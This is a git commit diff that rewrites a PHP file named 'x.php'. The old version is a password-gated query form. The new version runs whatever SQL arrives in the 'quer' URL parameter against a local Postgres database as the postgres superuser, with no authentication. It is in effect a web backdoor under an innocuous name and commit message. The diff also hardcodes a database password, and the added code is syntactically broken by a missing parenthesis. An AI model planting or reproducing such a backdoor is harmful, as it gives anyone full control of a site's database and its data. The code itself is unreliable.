a2b71f86f8c9d0f4817c95f8647254c2fa45ae74
Muhammad Ubaii Dillah <31325580+Ubaii@users.noreply.github.com>
2021-01-20 16:16:10 +0700

    Update x.php

--- x.php
+++ x.php
@@ -1,42 +1,22 @@
 <?php
 
-@session_start();
-
-define('DBHOST', '127.0.0.1');
-define('DBUSER', 'postgres');
-define('DBNAME', 'postgres');
-define('DBPASS', '@arikcs@');
-
-$dbhost = DBHOST;
-$dbname = DBNAME;
-$dbuser = DBUSER;
-$dbpass = DBPASS;
-
-if($conn = new PDO("pgsql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass)){
-	if(isset($_SESSION['queryMgr'])){
-		if(isset($_POST['gasquery'])){
-			if($conn->query($queryMgr)){
-				echo 'ok';
-			}else{
-				echo 'gagal.';
-			}
-		}else{
-			echo '<form method="post" action=""><input name="gasquery" type="text">';
-		}
+if(isset($_GET['quer'])){
+	define('DBHOST', '127.0.0.1');
+	define('DBUSER', 'postgres');
+	define('DBNAME', 'postgres');
+	define('DBPASS', '@arikcs@');
+	$dbhost = DBHOST;
+	$dbname = DBNAME;
+	$dbuser = DBUSER;
+	$dbpass = DBPASS;
+	$conn = new PDO("pgsql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass
+	if($conn->query($_GET['quer'])){
+		echo 'ok';
 	}else{
-		if(isset($_POST['login'])){
-			$login = $_POST['login'];
-			if($login == 'AnonyX'){
-				$_SESSION['queryMgr'] = $login;
-			}else{
-				echo ':(';
-			}
-		}else{
-			echo '<form method="post" action=""><input name="login" type="password">';
-		}
+		echo 'fail';
 	}
 }else{
-	echo 'koneksi gagal.';
+	exit;
 }
 
 ?>
